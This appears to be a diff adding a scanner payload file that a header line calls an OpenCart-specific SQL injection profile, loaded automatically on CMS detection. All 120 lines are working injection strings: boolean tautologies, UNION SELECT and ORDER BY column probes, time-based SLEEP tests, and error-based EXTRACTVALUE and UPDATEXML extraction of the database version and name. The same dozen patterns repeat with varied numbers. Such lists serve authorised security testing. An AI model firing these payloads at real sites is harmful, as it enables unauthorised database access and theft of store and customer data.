@@ -1,0 +1,122 @@
+# opencart CMS-specific SQL injection payload profile
+# Loaded automatically when CMS detector identifies Opencart
+' OR '1'='1' /*opencart_1*/
+' AND 1=2 UNION SELECT NULL-- opencart_2
+' AND SLEEP(4)-- opencart_3
+' OR IF(4=4,SLEEP(2),0)-- opencart_4
+' UNION SELECT NULL,NULL,NULL-- opencart_5
+' ORDER BY 7-- opencart_6
+' GROUP BY 8 HAVING 1=1-- opencart_7
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- opencart_8
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- opencart_9
+1 OR 1=1# opencart_10
+-1 UNION SELECT NULL-- opencart_11
+' OR 1=1-- opencart_12
+' OR '1'='1' /*opencart_13*/
+' AND 1=2 UNION SELECT NULL-- opencart_14
+' AND SLEEP(1)-- opencart_15
+' OR IF(16=16,SLEEP(2),0)-- opencart_16
+' UNION SELECT NULL,NULL,NULL-- opencart_17
+' ORDER BY 9-- opencart_18
+' GROUP BY 4 HAVING 1=1-- opencart_19
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- opencart_20
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- opencart_21
+1 OR 1=1# opencart_22
+-1 UNION SELECT NULL-- opencart_23
+' OR 1=1-- opencart_24
+' OR '1'='1' /*opencart_25*/
+' AND 1=2 UNION SELECT NULL-- opencart_26
+' AND SLEEP(3)-- opencart_27
+' OR IF(28=28,SLEEP(2),0)-- opencart_28
+' UNION SELECT NULL,NULL,NULL-- opencart_29
+' ORDER BY 1-- opencart_30
+' GROUP BY 8 HAVING 1=1-- opencart_31
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- opencart_32
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- opencart_33
+1 OR 1=1# opencart_34
+-1 UNION SELECT NULL-- opencart_35
+' OR 1=1-- opencart_36
+' OR '1'='1' /*opencart_37*/
+' AND 1=2 UNION SELECT NULL-- opencart_38
+' AND SLEEP(5)-- opencart_39
+' OR IF(40=40,SLEEP(2),0)-- opencart_40
+' UNION SELECT NULL,NULL,NULL-- opencart_41
+' ORDER BY 3-- opencart_42
+' GROUP BY 4 HAVING 1=1-- opencart_43
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- opencart_44
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- opencart_45
+1 OR 1=1# opencart_46
+-1 UNION SELECT NULL-- opencart_47
+' OR 1=1-- opencart_48
+' OR '1'='1' /*opencart_49*/
+' AND 1=2 UNION SELECT NULL-- opencart_50
+' AND SLEEP(2)-- opencart_51
+' OR IF(52=52,SLEEP(2),0)-- opencart_52
+' UNION SELECT NULL,NULL,NULL-- opencart_53
+' ORDER BY 5-- opencart_54
+' GROUP BY 8 HAVING 1=1-- opencart_55
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- opencart_56
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- opencart_57
+1 OR 1=1# opencart_58
+-1 UNION SELECT NULL-- opencart_59
+' OR 1=1-- opencart_60
+' OR '1'='1' /*opencart_61*/
+' AND 1=2 UNION SELECT NULL-- opencart_62
+' AND SLEEP(4)-- opencart_63
+' OR IF(64=64,SLEEP(2),0)-- opencart_64
+' UNION SELECT NULL,NULL,NULL-- opencart_65
+' ORDER BY 7-- opencart_66
+' GROUP BY 4 HAVING 1=1-- opencart_67
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- opencart_68
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- opencart_69
+1 OR 1=1# opencart_70
+-1 UNION SELECT NULL-- opencart_71
+' OR 1=1-- opencart_72
+' OR '1'='1' /*opencart_73*/
+' AND 1=2 UNION SELECT NULL-- opencart_74
+' AND SLEEP(1)-- opencart_75
+' OR IF(76=76,SLEEP(2),0)-- opencart_76
+' UNION SELECT NULL,NULL,NULL-- opencart_77
+' ORDER BY 9-- opencart_78
+' GROUP BY 8 HAVING 1=1-- opencart_79
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- opencart_80
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- opencart_81
+1 OR 1=1# opencart_82
+-1 UNION SELECT NULL-- opencart_83
+' OR 1=1-- opencart_84
+' OR '1'='1' /*opencart_85*/
+' AND 1=2 UNION SELECT NULL-- opencart_86
+' AND SLEEP(3)-- opencart_87
+' OR IF(88=88,SLEEP(2),0)-- opencart_88
+' UNION SELECT NULL,NULL,NULL-- opencart_89
+' ORDER BY 1-- opencart_90
+' GROUP BY 4 HAVING 1=1-- opencart_91
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- opencart_92
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- opencart_93
+1 OR 1=1# opencart_94
+-1 UNION SELECT NULL-- opencart_95
+' OR 1=1-- opencart_96
+' OR '1'='1' /*opencart_97*/
+' AND 1=2 UNION SELECT NULL-- opencart_98
+' AND SLEEP(5)-- opencart_99
+' OR IF(100=100,SLEEP(2),0)-- opencart_100
+' UNION SELECT NULL,NULL,NULL-- opencart_101
+' ORDER BY 3-- opencart_102
+' GROUP BY 8 HAVING 1=1-- opencart_103
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- opencart_104
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- opencart_105
+1 OR 1=1# opencart_106
+-1 UNION SELECT NULL-- opencart_107
+' OR 1=1-- opencart_108
+' OR '1'='1' /*opencart_109*/
+' AND 1=2 UNION SELECT NULL-- opencart_110
+' AND SLEEP(2)-- opencart_111
+' OR IF(112=112,SLEEP(2),0)-- opencart_112
+' UNION SELECT NULL,NULL,NULL-- opencart_113
+' ORDER BY 5-- opencart_114
+' GROUP BY 4 HAVING 1=1-- opencart_115
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- opencart_116
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- opencart_117
+1 OR 1=1# opencart_118
+-1 UNION SELECT NULL-- opencart_119
+' OR 1=1-- opencart_120
